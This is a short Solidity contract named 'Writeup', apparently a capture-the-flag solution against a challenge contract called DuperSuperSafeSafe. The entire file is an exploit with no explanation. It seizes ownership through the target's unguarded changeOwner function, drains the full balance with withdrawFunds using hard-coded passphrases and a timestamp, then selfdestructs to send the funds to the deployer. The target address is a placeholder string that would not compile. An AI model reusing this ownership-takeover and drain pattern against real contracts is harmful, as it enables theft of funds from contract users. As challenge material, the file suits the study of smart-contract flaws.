// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface DuperSuperSafeSafe{
  function changeOwner(address _newOwner) external;
  function withdrawFunds(uint _amount, bytes32 _secret_passphrase, bytes32 _secret_passphrase_2, uint _timestamp) external payable;
}

contract Writeup {
    address private target_address = "TARGET ADDRESS";
    uint private timestamp = 0x629b2490;
    address payable owner;
    DuperSuperSafeSafe private target = DuperSuperSafeSafe(payable(target_address));

    constructor() payable {
        owner = payable(msg.sender);
    }

    receive() external payable {}

    function become_owner() public {
      target.changeOwner(address(this));
    }
    
    function withdraw_funds() public {
      target.withdrawFunds(target_address.balance, bytes32("Wayyang"), bytes32("Cute"), timestamp);
    }

    function destruct() public {
      selfdestruct(owner);
    }

}